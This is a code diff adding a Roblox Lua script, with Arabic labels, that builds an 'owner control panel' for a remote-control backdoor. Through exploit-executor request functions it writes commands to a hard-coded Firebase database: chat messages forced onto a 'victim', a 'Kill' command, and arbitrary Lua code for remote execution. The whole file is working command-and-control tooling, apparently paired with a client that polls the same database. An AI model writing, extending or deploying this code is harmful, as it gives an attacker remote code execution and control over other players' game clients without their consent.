@@ -1,0 +1,141 @@
+local HttpService = game:GetService("HttpService")
+local Players     = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local UIS         = game:GetService("UserInputService")
+
+local firebaseUrl = "https://tast1-e066a-default-rtdb.asia-southeast1.firebasedatabase.app/command.json"
+local http_request = syn and syn.request or http_request or http.request or request
+
+-- إرسال أمر إلى Firebase
+local function sendCommand(command)
+    local ok, res = pcall(function()
+        return http_request({
+            Url = firebaseUrl,
+            Method = "PUT",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = HttpService:JSONEncode(command),
+        })
+    end)
+    if not ok or not res or (res.StatusCode < 200 or res.StatusCode >= 300) then
+        warn("❌ فشل إرسال الأمر:", res and res.StatusCode or "Error")
+    else
+        warn("✅ تم إرسال الأمر:", command)
+    end
+end
+
+-- واجهة GUI
+local ScreenGui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
+ScreenGui.ResetOnSpawn = false
+
+local Frame = Instance.new("Frame", ScreenGui)
+Frame.Size = UDim2.new(0, 320, 0, 320)
+Frame.Position = UDim2.new(0.5, -160, 0.5, -160)
+Frame.AnchorPoint = Vector2.new(0.5, 0.5)
+Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+
+local Title = Instance.new("TextLabel", Frame)
+Title.Size = UDim2.new(1, 0, 0, 30)
+Title.Text = "لوحة تحكم المالك"
+Title.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+Title.TextColor3 = Color3.new(1, 1, 1)
+Title.TextScaled = true
+
+local MessageBox = Instance.new("TextBox", Frame)
+MessageBox.Size = UDim2.new(0.9, 0, 0.1, 0)
+MessageBox.Position = UDim2.new(0.05, 0, 0.15, 0)
+MessageBox.PlaceholderText = "اكتب رسالة للضحية"
+MessageBox.ClearTextOnFocus = false
+MessageBox.Text = ""
+
+local SendButton = Instance.new("TextButton", Frame)
+SendButton.Size = UDim2.new(0.9, 0, 0.1, 0)
+SendButton.Position = UDim2.new(0.05, 0, 0.27, 0)
+SendButton.Text = "📩 إرسال رسالة"
+SendButton.BackgroundColor3 = Color3.fromRGB(70, 130, 180)
+SendButton.TextColor3 = Color3.new(1, 1, 1)
+
+local KillButton = Instance.new("TextButton", Frame)
+KillButton.Size = UDim2.new(0.9, 0, 0.1, 0)
+KillButton.Position = UDim2.new(0.05, 0, 0.4, 0)
+KillButton.Text = "☠️ قتل الضحية"
+KillButton.BackgroundColor3 = Color3.fromRGB(180, 50, 50)
+KillButton.TextColor3 = Color3.new(1, 1, 1)
+
+local ScriptBox = Instance.new("TextBox", Frame)
+ScriptBox.Size = UDim2.new(0.9, 0, 0.2, 0)
+ScriptBox.Position = UDim2.new(0.05, 0, 0.55, 0)
+ScriptBox.PlaceholderText = "-- اكتب سكربت Lua هنا"
+ScriptBox.ClearTextOnFocus = false
+ScriptBox.MultiLine = true
+ScriptBox.TextWrapped = true
+ScriptBox.TextYAlignment = Enum.TextYAlignment.Top
+ScriptBox.Text = ""
+
+local RunButton = Instance.new("TextButton", Frame)
+RunButton.Size = UDim2.new(0.9, 0, 0.1, 0)
+RunButton.Position = UDim2.new(0.05, 0, 0.78, 0)
+RunButton.Text = "📜 تنفيذ سكربت"
+RunButton.BackgroundColor3 = Color3.fromRGB(100, 100, 200)
+RunButton.TextColor3 = Color3.new(1, 1, 1)
+
+-- الأوامر
+SendButton.MouseButton1Click:Connect(function()
+    local text = MessageBox.Text
+    if text ~= "" then
+        sendCommand("Chat:" .. text)
+        MessageBox.Text = ""
+    end
+end)
+
+KillButton.MouseButton1Click:Connect(function()
+    sendCommand("Kill")
+end)
+
+RunButton.MouseButton1Click:Connect(function()
+    local code = ScriptBox.Text
+    if code ~= "" then
+        sendCommand("Run:" .. code)
+    end
+end)
+
+-- سحب الواجهة (يدعم الماوس واللمس)
+local dragging, dragStart, startPos
+
+local function startDrag(input)
+    dragging = true
+    dragStart = input.Position
+    startPos = Frame.Position
+    input.Changed:Connect(function()
+        if input.UserInputState == Enum.UserInputState.End then
+            dragging = false
+        end
+    end)
+end
+
+local function updateDrag(input)
+    if dragging then
+        local delta = input.Position - dragStart
+        Frame.Position = UDim2.new(
+            startPos.X.Scale, startPos.X.Offset + delta.X,
+            startPos.Y.Scale, startPos.Y.Offset + delta.Y
+        )
+    end
+end
+
+Frame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        startDrag(input)
+    end
+end)
+
+Frame.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+        updateDrag(input)
+    end
+end)
+
+UIS.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+        updateDrag(input)
+    end
+end)
